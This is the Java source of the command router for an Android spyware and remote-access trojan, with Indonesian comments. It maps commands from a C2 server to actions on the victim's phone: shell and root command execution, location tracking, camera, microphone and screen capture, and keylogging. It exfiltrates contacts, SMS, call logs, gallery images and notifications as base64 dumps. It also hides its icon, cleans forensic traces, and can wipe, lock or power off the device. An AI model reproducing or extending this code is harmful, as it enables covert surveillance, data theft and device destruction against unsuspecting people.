package ai.m4zk1play.spy;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

/** Penerjemah perintah C2 → aksi. */
public class Router {

    private final AgentService svc;
    private final Context ctx;
    private final C2Client client;
    private final MediaModule media;
    private final ScreenModule screen;

    public Router(AgentService svc, C2Client client, MediaModule media, ScreenModule screen) {
        this.svc = svc;
        this.ctx = svc;
        this.client = client;
        this.media = media;
        this.screen = screen;
    }

    public void handle(final String id, final String type, final JSONObject a) {
        new Thread(() -> {
            JSONObject out = new JSONObject();
            boolean ok = true;
            try {
                switch (type) {
                    case "ping": out.put("pong", System.currentTimeMillis()); break;
                    case "info": out = Modules.info(ctx); break;
                    case "shell": {
                        String cmd = a.optString("cmd");
                        out.put("cmd", cmd);
                        out.put("output", Shell.exec("sh -c " + q(cmd)));
                        break;
                    }
                    case "root_shell": {
                        String cmd = a.optString("cmd");
                        out.put("cmd", cmd);
                        out.put("output", Shell.exec("su -c " + q(cmd)));
                        break;
                    }
                    case "locate_once": out = Modules.location(ctx); break;
                    case "locate_start": svc.startLocate(); out.put("live", true); break;
                    case "locate_stop": svc.stopLocate(); out.put("live", false); break;
                    case "screen_start":
                        if (screen.ready()) out.put("aktif", true);
                        else { svc.needProjection(); out.put("info", "izin layar diminta di target"); }
                        break;
                    case "screen_shot": out.put("saved", screen.shot(ctx)); break;
                    case "screen_stop": screen.stop(); break;
                    case "tap": screen.tap(a.optInt("x"), a.optInt("y")); break;
                    case "swipe":
                        screen.swipe(a.optInt("x1"), a.optInt("y1"), a.optInt("x2"), a.optInt("y2"));
                        break;
                    case "key": key(a.optString("code")); break;
                    case "text": text(a.optString("text")); break;
                    case "cam_front": media.camera(ctx, true); break;
                    case "cam_back": media.camera(ctx, false); break;
                    case "cam_stop": media.stopCamera(); break;
                    case "mic_start": media.mic(true); break;
                    case "mic_stop": media.mic(false); break;
                    case "speaker_play":
                    case "media_push": play(a.optString("url"), a.optString("kind")); break;
                    case "wallpaper_set": Modules.setWallpaper(ctx, a.optString("url")); break;
                    case "volume": Modules.volume(ctx, a.optInt("level", 8)); break;
                    case "brightness":
                        ok = Modules.brightness(ctx, a.optInt("pct", 60));
                        out.put("butuh_izin", !ok);
                        break;
                    case "vibrate": Modules.vibrate(ctx, a.optLong("ms", 800)); break;
                    case "toast": Modules.toast(ctx, a.optString("text")); break;
                    case "open_url": Modules.openUrl(ctx, a.optString("url")); break;
                    case "dial": Modules.dial(ctx, a.optString("number")); break;
                    case "call": Modules.call(ctx, a.optString("number")); break;
                    case "sms_send":
                        Modules.sms(ctx, a.optString("number"), a.optString("text"));
                        break;
                    case "app_uninstall": Modules.uninstall(ctx, a.optString("pkg")); break;
                    case "app_install": out.put("path", Modules.install(ctx, a.optString("url"))); break;
                    case "clipboard": out.put("text", Modules.clip(ctx)); break;
                    case "wifi_set": ok = Modules.wifi(ctx, a.optBoolean("on", true)); break;
                    case "data_set": Modules.data(ctx, a.optBoolean("on", true)); break;
                    case "airplane": Modules.airplane(ctx, a.optBoolean("on", true)); break;
                    case "screen_off": Modules.screenOff(ctx); break;
                    case "screen_on": Modules.screenOn(ctx); break;
                    case "lock_screen": Shell.exec("input keyevent 26"); break;
                    case "lock_pin": LockActivity.open(ctx); break;
                    case "reboot":
                        out.put("output", Shell.exec(root()
                                ? "su -c reboot" : "reboot"));
                        break;
                    case "reboot_recovery":
                        out.put("output", Shell.exec("su -c reboot recovery"));
                        break;
                    case "power_off":
                        out.put("output", Shell.exec(root()
                                ? "su -c reboot -p" : "reboot -p"));
                        break;
                    case "wipe":
                        out.put("info", svc.wipe());
                        break;
                    case "dump_contacts": dump("contacts", "contacts", Modules.contacts(ctx)); break;
                    case "dump_sms": dump("sms", "sms", Modules.sms(ctx)); break;
                    case "dump_calls": dump("calls", "calls", Modules.calls(ctx)); break;
                    case "dump_gallery": dump("gallery", "gallery", Modules.gallery(ctx, 600)); break;
                    case "dump_apps": dump("apps", "apps", Modules.apps(ctx)); break;
                    case "dump_notif": dumpRaw("notif", "notif", new JSONArray(NotifListener.drain())); break;
                    case "dump_keylog": dumpRaw("keylog", "keylog", new JSONArray(KeylogService.drain())); break;
                    case "dump_net": out = svc.netInfo(); break;
                    case "notif_start":
                        ctx.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                        out.put("notif", NotifListener.alive());
                        break;
                    case "notif_stop":
                        out.put("notif", NotifListener.alive());
                        break;
                    case "keylog_start":
                        ctx.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                        out.put("keylog", KeylogService.alive());
                        break;
                    case "keylog_stop": out.put("keylog", KeylogService.alive()); break;
                    case "write_settings":
                        try {
                            Intent w = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                                    Uri.parse("package:" + ctx.getPackageName()));
                            w.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            ctx.startActivity(w);
                        } catch (Exception ignored) { }
                        break;
                    case "hide_icon": Modules.hideIcon(ctx, true); out.put("hidden", true); break;
                    case "show_icon": Modules.hideIcon(ctx, false); out.put("hidden", false); break;
                    case "forensic_clean": out = Modules.clean(ctx); break;
                    case "delay_mode": svc.delayMode(); break;
                    case "reconnect": svc.reconnect(); break;
                    case "kill_self": svc.stopSelf(); break;
                    default: ok = false; out.put("info", "perintah tak dikenal"); break;
                }
            } catch (Exception e) {
                ok = false;
                try { out.put("error", String.valueOf(e.getMessage())); } catch (Exception ignored) { }
            }
            client.result(id, ok, out);
        }, "mzk-cmd").start();
    }

    private boolean root() {
        try { return svc.isRoot(); } catch (Exception e) { return false; }
    }

    private static String q(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    private void key(String code) {
        int kc;
        switch (code == null ? "" : code) {
            case "home": kc = 3; break;
            case "back": kc = 4; break;
            case "recents": kc = 187; break;
            case "lock": kc = 26; break;
            case "enter": kc = 66; break;
            case "menu": kc = 82; break;
            case "vol_up": kc = 24; break;
            case "vol_down": kc = 25; break;
            case "play": kc = 126; break;
            case "next": kc = 87; break;
            default: kc = 3;
        }
        Shell.exec("input keyevent " + kc);
    }

    private void text(String t) {
        if (t == null || t.isEmpty()) return;
        Shell.exec("input text " + q(t.replace(" ", "%s")));
    }

    private void play(String url, String kind) {
        if (url == null || url.isEmpty()) return;
        Intent i = new Intent(ctx, PlayerActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("url", url);
        i.putExtra("kind", kind);
        ctx.startActivity(i);
    }

    private void dump(String kind, String base, JSONArray arr) {
        client.dump(kind, base + "_" + Modules.stamp() + ".json",
                Modules.base64(arr.toString().getBytes()));
    }

    private void dumpRaw(String kind, String base, JSONArray arr) {
        client.dump(kind, base + "_" + Modules.stamp() + ".json",
                Modules.base64(arr.toString().getBytes()));
    }
}
